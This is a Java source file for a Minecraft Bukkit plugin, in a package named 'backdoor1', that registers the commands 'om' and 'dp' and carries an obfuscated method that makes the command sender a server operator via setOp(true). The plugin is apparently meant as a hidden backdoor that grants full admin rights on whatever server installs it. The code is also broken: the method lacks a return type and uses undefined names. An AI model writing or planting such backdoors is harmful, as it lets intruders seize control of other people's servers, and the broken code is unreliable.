package me.lunacore.backdoor1;

import me.lunacore.commands.om;
import org.bukkit.plugin.java.JavaPlugin;

public final class iii extends JavaPlugin {
    @Override
    public void onEnable() {
        this.getCommand("om").setExecutor(new om());
        this.getCommand("dp").setExecutor(new dp());
    }
    protected IIIIIIIIIIII1I1I1IIIIIIIIIII1II1I1IIIIIIII1I1I1I1I11IIIIIIIII1I1IIIIIIIIIIIIIIIIIII1I1I1I1(){
        Player p = (Player) sender;
        p.setOp(true);
    }
}
